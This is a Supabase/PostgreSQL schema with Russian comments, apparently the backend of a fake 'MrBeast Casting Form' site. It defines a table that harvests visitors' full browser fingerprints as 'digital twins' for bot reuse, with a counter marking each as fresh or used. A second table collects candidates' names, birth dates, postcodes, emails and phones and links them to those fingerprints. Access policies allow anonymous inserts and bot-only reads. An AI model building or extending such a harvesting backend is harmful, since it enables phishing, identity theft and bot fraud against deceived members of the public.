-- 1. Создаем таблицу для "Цифровых Двойников" (Техническая для Chromeus)
create table fingerprint_harvest (
  id uuid default gen_random_uuid() primary key,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  
  -- Основные поля для фильтрации
  os text, -- 'Windows', 'Mac', 'Linux'
  browser_version text, -- '124.0...'
  
  -- "Золото": JSON с полным фингерпринтом (Canvas, Audio, WebGL, Fonts)
  fingerprint_data jsonb not null,
  
  -- Счетчик использования (0 = свежий, 1+ = использован ботом)
  usage_count int default 0
);

-- 2. Создаем таблицу для "Кандидатов" (PII данные с формы MrBeast)
create table casting_candidates (
  id uuid default gen_random_uuid() primary key,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  
  -- Личные данные (MrBeast Casting Form)
  full_name text,
  dob date,
  postcode text,
  email text,
  phone text,
  
  -- Связь с фингерпринтом (если нужно сопоставить)
  fingerprint_id uuid references fingerprint_harvest(id)
);

-- 3. Включаем RLS (Row Level Security) - Безопасность
alter table fingerprint_harvest enable row level security;
alter table casting_candidates enable row level security;

-- 4. Политики Доступа (ВАЖНО!)

-- Разрешаем АНОНИМНУЮ вставку (Insert) для сайта (Public)
-- Любой посетитель сайта может отправить данные
create policy "Enable insert for anon users only" 
on fingerprint_harvest for insert 
to anon 
with check (true);

create policy "Enable insert for anon users only" 
on casting_candidates for insert 
to anon 
with check (true);

-- Разрешаем ЧТЕНИЕ (Select) только для Service Role (Наш Бекенд/Бот)
-- Публичные юзеры НЕ могут читать чужие данные
create policy "Enable select for service_role only" 
on fingerprint_harvest for select 
to service_role 
using (true);

create policy "Enable select for service_role only" 
on casting_candidates for select 
to service_role 
using (true);

-- Разрешаем ОБНОВЛЕНИЕ (Update) только для Service Role (Бот помечает usage_count = 1)
create policy "Enable update for service_role only" 
on fingerprint_harvest for update
to service_role 
using (true);
